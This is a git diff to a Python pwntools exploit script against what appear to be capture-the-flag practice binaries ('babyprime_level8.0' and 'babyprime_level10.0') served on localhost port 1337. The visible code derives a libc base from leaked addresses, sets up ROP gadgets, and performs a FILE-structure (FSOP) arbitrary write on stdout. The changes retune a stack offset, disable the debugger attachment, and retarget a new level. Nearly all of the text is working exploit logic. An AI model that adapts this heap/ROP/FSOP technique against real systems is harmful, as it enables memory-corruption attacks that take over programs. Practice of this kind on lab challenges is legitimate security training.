@@ -145,7 +145,7 @@ def exploit(r1, r2, p):
 		
 		rbp_addr = stack_leak - 0x810
 		libc_base = libc_leak - 0x219c80
-		random_pointer = stack_leak - 0xd80 - 0x20
+		random_pointer = stack_leak - 0xd80 - 0x20 - 0x90
 		# gadgets
 		pop_rdi = libc_base + 0x000000000002a3e5 # rop chain
 		pop_rsi = libc_base + 0x000000000002be51 # rop chain
@@ -277,10 +277,10 @@ def exploit(r1, r2, p):
 		
 		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
 		
-		gdb.attach(p, s)
-		pause()
-		r1.sendline(b"haha")	
-		r1.interactive()	
+		#gdb.attach(p, s)
+		#pause()
+		#r1.sendline(b"haha")	
+		#r1.interactive()	
 		
 		
 		try:
@@ -309,7 +309,7 @@ def main():
 		idx = 2
 		
 		try: # code that might fail 
-			binary = './babyprime_level8.0'
+			binary = './babyprime_level10.0'
 			p = process(binary)
 			r1 = remote("localhost", 1337, timeout = 1)
 			r2 = remote("localhost", 1337, timeout = 1)
